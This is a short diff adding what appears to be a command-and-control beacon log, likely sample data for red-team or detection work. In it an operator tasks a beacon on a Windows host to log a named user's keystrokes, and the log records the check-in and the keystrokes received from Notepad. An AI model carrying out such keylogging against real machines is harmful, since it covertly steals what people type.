@@ -1,0 +1,10 @@
+11/18 14:31:46 UTC [metadata] 192.168.3.108 <- 192.168.3.108; computer: COMPUTER001; user: ALLISON_POWELL; process: WinProcess.exe; pid: 1640; os: Windows; version: 10.0; build: 14393; beacon arch: x64 (x64)
+11/18 14:31:54 UTC [input] <analyst01> keylogger
+11/18 14:31:54 UTC [task] <T1056, T1093> Tasked beacon to log keystrokes
+11/18 14:32:39 UTC [checkin] host called home, sent: 83049 bytes
+11/18 14:33:40 UTC [output]
+received keystrokes from Untitled - Notepad by ALLISON_POWELL
+
+11/18 14:34:40 UTC [output]
+received keystrokes from Untitled - Notepad by ALLISON_POWELL
+
